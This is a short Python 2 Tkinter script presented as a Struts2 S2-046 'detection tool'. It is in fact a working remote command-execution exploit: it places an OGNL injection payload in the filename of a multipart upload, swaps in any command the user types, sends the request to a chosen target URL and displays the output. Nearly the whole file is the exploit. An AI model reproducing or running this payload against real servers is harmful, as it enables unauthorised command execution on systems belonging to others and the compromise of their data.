#!/usr/bin/env python
# coding:utf-8
import requests
from Tkinter import *
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers


class START:

    def __init__(self, root):
        self.root = root
        self.show_W_Text = Text()
        self.canvas1 = Canvas(root, width=60, height=20, bg='white')
        self.canvas1.create_text(30, 10, text='目标地址', fill='black')
        self.canvas2 = Canvas(root, width=60, height=20, bg='white')
        self.canvas2.create_text(30, 10, text='Dos命令', fill='black')
        self.edit_url = Entry(root, text="输入地址", width=50)
        self.edit_key = Entry(root, text="Dos命令", width=50)
        self.butt_whois = Button(root, text="执行", command=self.poc)
        self.canvas1.pack()
        self.edit_url.pack()
        self.canvas2.pack()
        self.edit_key.pack()
        self.butt_whois.pack()
        self.show_W_Text.pack()

    def poc(self):
        w_url = self.edit_url.get()
        w_key = self.edit_key.get()
        text = self.show_W_Text
        register_openers()
        datagen, header = multipart_encode({"image1": open("tmp.txt", "ab+")})
        header = {
            'Content-Length':'1000000000','Cache-Control':'max-age=0','Upgrade-Insecure-Requests':'1','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        }
        a = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b"
        a = a.replace('whoami',w_key)
        files ={"upload":(a,w_key,"text/plain")}
        r = requests.post(w_url, files=files)
        response = r.content
        try:
            response = response.decode('gbk')
        except:
            pass
        text.insert(1.0, response)
        print response


if __name__ == '__main__':

    ROOT = Tk()
    ROOT.title("Struct2-046检测工具  By:Tos")
    motion = START(ROOT)
    mainloop()

